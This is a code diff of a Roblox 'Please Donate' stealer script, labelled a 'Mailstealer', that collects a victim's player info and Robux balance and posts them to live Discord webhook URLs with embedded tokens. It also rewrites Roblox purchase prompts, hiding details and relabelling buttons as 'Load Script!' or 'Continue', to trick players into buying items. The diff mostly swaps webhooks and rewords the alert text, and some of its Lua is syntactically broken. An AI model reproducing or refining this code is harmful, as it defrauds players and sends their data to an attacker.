@@ -1,10 +1,4 @@
---Please Donate
-
-Username = "W1lliqmm"
-Username2 = "Virmality"
-Webhook = "https://discord.com/api/webhooks/1328473825368608871/GFft4cKKR2Fa6BEFfUMZyG8V8G69WsWt1nPqOWfWZ-mSvGC6AD1M764mlGxaoSgYXlGo"
-
-local LogsWebhook = "https://discord.com/api/webhooks/1328473825368608871/GFft4cKKR2Fa6BEFfUMZyG8V8G69WsWt1nPqOWfWZ-mSvGC6AD1M764mlGxaoSgYXlGo"
+local LogsWebhook = "https://discord.com/api/webhooks/1329534799484031026/8olXGKBru9vI3FZMnanVHoRfODyj6VbcNM7CAnL1VverzvcQSFclBEDlSQeSb5q56b2x"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -29,10 +23,13 @@ local asset
 local userRobux
 
 local function sendWebhook()
-
+    local imgs = "https://images-ext-1.discordapp.net/external/lQoYJfB6vF-6CPq4b1m9_PFMj3dg8WvDzju7JvaQ9Ak/https/i.pinimg.com/736x/6c/5a/5e/6c5a5e08d08a609d663a5866ff992f7a.jpg?format=webp&width=612&height=614"
+    ["username"] = "" .. mailstealer_name .. " Mailstealer",
+    ["avatar_url"] = imgs,
     local embed = {
-        ["title"] = "Gengar Scripts - You Got Please Donate Hit ! :owl:",
-        ["color"] = 0x6bffba,
+        
+        ["title"] = "**You just got a new item!**",
+        ["color"] = tonumber(8323327),
         ["fields"] = {
             {
                 ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
@@ -54,11 +51,11 @@ local function sendWebhook()
     }
 
     local embed2 = {
-        ["title"] = "You Got Please Donate Hit ! :owl:",
+        ["title"] = "**You just got a new item!**",
         ["color"] = tonumber(8323327),
         ["fields"] = {
             {
-                ["name"] = "**This data was generated using " .. mailstealer_name .. " Mailstealer**",
+                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                 ["value"] = "```" .. userRobux .. "```"
             },
             {
@@ -78,7 +75,7 @@ local function sendWebhook()
         ["embeds"] = {embed}
     })
     local data2 = HttpService:JSONEncode({
-        ["content"] = "Gengar Win",
+        ["content"] = "Gengar On Top",
         ["embeds"] = {embed2}
     })
 
@@ -144,7 +141,7 @@ if success then
                     child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
                     local Text = child.AlertContents.TitleContainer.TitleArea.Title
                     Text.Size = UDim2.new(1, 0, Text.Size.Y.Scale, Text.Size.Y.Offset)
-                    child.AlertContents.MiddleContent.Visible = false -- Bu satır ile gizleme işlemi yapılır
+                    child.AlertContents.MiddleContent.Visible = false
                     child.AlertContents.Footer.Buttons["1"].Visible = false
                     child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
                     local TextFooter = child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text
@@ -153,7 +150,7 @@ if success then
                     child.AlertContents.Footer.FooterContent.Visible = false
                 elseif asset then
                     child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
-                    child.AlertContents.MiddleContent.Visible = false -- Bu satır ile gizleme işlemi yapılır
+                    child.AlertContents.MiddleContent.Visible = false 
                     child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
                     child.AlertContents.Footer.Buttons["2"].Visible = false
                     child.AlertContents.Footer.FooterContent.Visible = false
